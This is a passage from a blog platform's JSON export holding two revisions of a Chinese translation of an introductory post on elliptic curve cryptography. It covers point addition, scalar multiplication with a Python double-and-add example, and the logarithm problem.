的结果</strong>.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \\n    \\n  <ul>\\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\\\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\\n  </ul>\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-point-doubling.gif\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\\n</pre>\"}],[\"html\",{\"html\":\"当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.\"}],[\"html\",{\"html\":\"<p>\\n  <ul>\\n    <li> <strong> 如果 $P \\\\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\\n  </ul>\\n<p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-tangent-line.gif\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \\n很容易就能看出两点之和为切点关于x轴的对称点.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\\n</p>\\n\\n<p>\\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">HTML5/JavaScript版可视化工具</a> !</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\\\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\\\"> Promgramming BitCoin 的第二章 </a> </strong> \\n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \\n</pre>\\n\\n<p>\\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\\n</p>\\n\\n<p>\\n    如果 P 和 Q 不相等 ($x_P \\\\ne x_Q$), 则过两点的直线的斜率为:\\n    $$ m = \\\\frac{y_P - y_Q}{x_P - x_Q} $$ \\n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\\n    $$ \\n    \\\\begin{array}{rcl}\\n    x_R & = & m^2 - x_P - x_Q \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P)\\n\\t\\\\end{array} \\n    $$\\n    或者写成: \\n    $$ y_R = y_Q + m(x_R - x_Q) $$\\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\\n</p>\\n\\n<p>\\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\\n</p>\\n\\n<p>\\n    作为替代方案, 我们可以用一个<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{2 - 4}{1 - 3} = 1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\\\cdot (-3 - 1) = -2 \\\\\\\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\\\cdot (-3 - 3) = -2\\n\\\\end{array}\\n    $$\\n    很好, 结果是正确的!\\n</p>\\n\\n<p>\\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{4 - 2}{-1 - 1} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 4 + -1 \\\\cdot (1 - (-1)) = 2\\n\\\\end{array}\\n    $$\\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\\\">可视化工具</a>算出的结果是一样的\\n</p>\\n    \\n<p>\\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\\n    $$ m = \\\\frac{3 x_P^2 + a}{2 y_P} $$\\n    正如我们所料, m 的表达式是如下方程的一阶导数: \\n    $$ y_P = \\\\pm \\\\sqrt{x_P^3 + ax_P + b} $$\\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{3x_P^2 + a}{2 y_P} = \\\\frac{3 \\\\cdot 1^2 - 7}{2 \\\\cdot 2} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\\\cdot (-1 - 1) = 4\\n\\\\end{array}\\n    $$\\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\\\">结果是正确的!</a>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法\"}],[\"html\",{\"html\":\"<p>\\n\\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \\n    $$ \\n    nP = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n  \\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\\\">可视化工具</a>, 有兴趣的话可以看看.\\n</p>\\n\\n<p>\\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\\n</p>\\n\\n<p>\\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\\n    $$\\n    \\\\begin{array}{rcl}\\n    151 & = & 1 \\\\cdot 2^7 + 0 \\\\cdot 2^6 + 0 \\\\cdot 2^5 + 1 \\\\cdot 2^4 + 0 \\\\cdot 2^3 + 1 \\\\cdot 2^2 + 1 \\\\cdot 2^1 + 1 \\\\cdot 2^0 \\\\\\\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\\n\\\\end{array}\\n    $$\\n    (将n转换成二进制并表示为多个2的指数次之和)\\n    通过上面的表达式, 我们可以写出: \\n    $$\\n    151 \\\\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\\n    $$\\n    倍加法的具体实现步骤如下:\\n    <ul>\\n        <li> 找到点 P </li>\\n        <li> 翻倍, 得到 2P </li>\\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\\n        <li> 2P 翻倍, 得到 2^2P </li>\\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\\n        <li> 别加$2^3P$ </li>\\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\\n        <li> ... </li>\\n    </ul>\\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\\\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\\n</p>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef bits(n):\\n    \\\"\\\"\\\"\\n    Generates the binary digits of n, starting\\n    from the least significant bit.\\n\\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\\n    \\\"\\\"\\\"\\n    while n:\\n        yield n & 1\\n        n >>= 1\\n\\ndef double_and_add(n, x):\\n    \\\"\\\"\\\"\\n    Returns the result of n * x, computed using\\n    the double and add algorithm.\\n    \\\"\\\"\\\"\\n    result = 0\\n    addend = x\\n\\n    for bit in bits(n):\\n        if bit == 1:\\n            result += addend\\n        addend *= 2\\n\\n    return result\\n```\"}],[\"html\",{\"html\":\"<p>\\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 对数\"}],[\"html\",{\"html\":\"<p>\\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\\\"对数\\\"而不是\\\"除法\\\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\\n</p>\\n\\n<p>\\n    我没听说过任何\\\"简单\\\"的算法可以用于解决对数难题, 不过通过<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\\\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\\n</p>\\n\\n<p>\\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\\\"容易的\\\", 不过求解离散对数将会成为一个\\\"十分困难\\\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 下周见\"}],[\"html\",{\"html\":\"<p>\\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 那么就敬请期待吧!\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[10,31],[10,32],[10,33],[10,34],[10,35],[10,36],[10,37],[10,38],[10,39],[10,40],[10,41],[10,42],[10,43],[10,44],[10,45],[1,\"p\",[]]]}","created_at_ts":1577086179614,"created_at":"2019-12-23 07:29:39"},{"id":"5e006d1a2ee0ee00018198c3","post_id":"5dfc7ca42ee0ee000181900e","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 **ECC**, **ECD**或者**ECDSA**. ECC是椭圆曲线密码学(`Elliptic Curve Cryptography`)的首字母缩写, 而另外两个都是基于ECC实现的算法.\"}],[\"markdown\",{\"markdown\":\"如今, 我们在 [TLS](https://tools.ietf.org/html/rfc4492), [PGP](https://tools.ietf.org/html/rfc6637) 和 [SSH](https://tools.ietf.org/html/rfc5656) 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在[比特币](https://en.bitcoin.it/wiki/Secp256k1)和其他各种加密货币中发挥的巨大作用了.\"}],[\"markdown\",{\"markdown\":\"在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和[可以轻松实现的简化模型](http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/), 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\"}],[\"markdown\",{\"markdown\":\"希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的**目标**并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 **什么是ECC以及它为什么是安全的**, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\"}],[\"markdown\",{\"markdown\":\"具体来说, 本系列文章将涉及以下内容: \\n\\n1. [实数域上的椭圆曲线和群论](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/) (本篇文章将会讨论)\\n2. [有限域上的椭圆曲线和离散对数难题](http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh)\\n3. [秘钥对的生成及两种ECC算法: ECDH和ECDSA](http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh)\\n4. [ECC破解算法和与RSA的对比](http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh)\"}],[\"markdown\",{\"markdown\":\"为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是\\\"简单\\\"问题, 什么是\\\"复杂\\\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线 \\n\\n首先, 什么是椭圆曲线? [Wolfram MathWorld](http://mathworld.wolfram.com/) 给出了一个超赞且完善的[定义](http://mathworld.wolfram.com/EllipticCurve.html). 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合: \"}],[\"html\",{\"html\":\"$$y^2 = x^3 + ax + b$$\"}],[\"html\",{\"html\":\"且满足 $4a^3 + 27b^2 \\\\ne 0$ (以便排除<a href=\\\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\\\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\"}],[\"image\",{\"src\":\"/content/images/2019/12/curves.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\\n</pre>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singularities.png\"}],[\"html\",{\"html\":\"奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.\"}],[\"markdown\",{\"markdown\":\"根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:\"}],[\"html\",{\"html\":\"$$\\\\left\\\\{ (x, y) \\\\in \\\\mathbb{R}^2\\\\ |\\\\ y^2 = x^3 + ax + b,\\\\ 4 a^3 + 27 b^2 \\\\ne 0 \\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{ 0 \\\\right\\\\}$$\"}],[\"markdown\",{\"markdown\":\"# 群\\n\\n\"}],[\"html\",{\"html\":\"<p>\\n数学上的群是指定义了一个用\\\"+\\\"表示的二元运算\\\"加法\\\"的集合. 为了让集合 $\\\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \\n</p>\\n\\n<ol>\\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\\\mathbb{G}$ 中的元素 </li>\\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$</li>\\n</ol>\\n\\n如果我们再加上第五个条件: \\n<br>\\n<strong>交换律:</strong> $a + b = b + a$\\n<br>\\n那么这个群就可以被称作<strong>阿贝尔群</strong>\\n\\n<p>\\n    根据加法的一般概念, 整数集合 $\\\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\\n</p>\\n\\n<p>\\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线上的群律\"}],[\"html\",{\"html\":\"<p id=\\\"group-law\\\">\\n    我们可以在椭圆曲线上定义一个群, 具体来说:\\n</p>\\n\\n<ul>\\n  <li>\\n    群里的元素是椭圆曲线上的点\\n  </li>\\n  <li>\\n    <strong>单位元</strong>是指在无穷远处的点 0\\n  </li>\\n  <li>\\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\\n  </li>\\n  <li>\\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\\n  </li>\\n</ul>\"}],[\"image\",{\"src\":\"/content/images/2019/12/three-aligned-points.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n在一条直线上的三点之和为0\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\\\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 这是一个阿贝尔群.</strong>\\n</p>\\n\\n<p>\\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 几何意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 的结果</strong>.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \\n    \\n  <ul>\\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\\\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\\n  </ul>\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-point-doubling.gif\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\\n</pre>\"}],[\"html\",{\"html\":\"当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.\"}],[\"html\",{\"html\":\"<p>\\n  <ul>\\n    <li> <strong> 如果 $P \\\\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\\n  </ul>\\n<p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-tangent-line.gif\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \\n很容易就能看出两点之和为切点关于x轴的对称点.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\\n</p>\\n\\n<p>\\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">HTML5/JavaScript版可视化工具</a> !</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\\\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\\\"> Promgramming BitCoin 的第二章 </a> </strong> \\n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \\n</pre>\\n\\n<p>\\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\\n</p>\\n\\n<p>\\n    如果 P 和 Q 不相等 ($x_P \\\\ne x_Q$), 则过两点的直线的斜率为:\\n    $$ m = \\\\frac{y_P - y_Q}{x_P - x_Q} $$ \\n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\\n    $$ \\n    \\\\begin{array}{rcl}\\n    x_R & = & m^2 - x_P - x_Q \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P)\\n\\t\\\\end{array} \\n    $$\\n    或者写成: \\n    $$ y_R = y_Q + m(x_R - x_Q) $$\\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\\n</p>\\n\\n<p>\\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\\n</p>\\n\\n<p>\\n    作为替代方案, 我们可以用一个<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{2 - 4}{1 - 3} = 1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\\\cdot (-3 - 1) = -2 \\\\\\\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\\\cdot (-3 - 3) = -2\\n\\\\end{array}\\n    $$\\n    很好, 结果是正确的!\\n</p>\\n\\n<p>\\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{4 - 2}{-1 - 1} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 4 + -1 \\\\cdot (1 - (-1)) = 2\\n\\\\end{array}\\n    $$\\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\\\">可视化工具</a>算出的结果是一样的\\n</p>\\n    \\n<p>\\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\\n    $$ m = \\\\frac{3 x_P^2 + a}{2 y_P} $$\\n    正如我们所料, m 的表达式是如下方程的一阶导数: \\n    $$ y_P = \\\\pm \\\\sqrt{x_P^3 + ax_P + b} $$\\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\\n    $$\\n    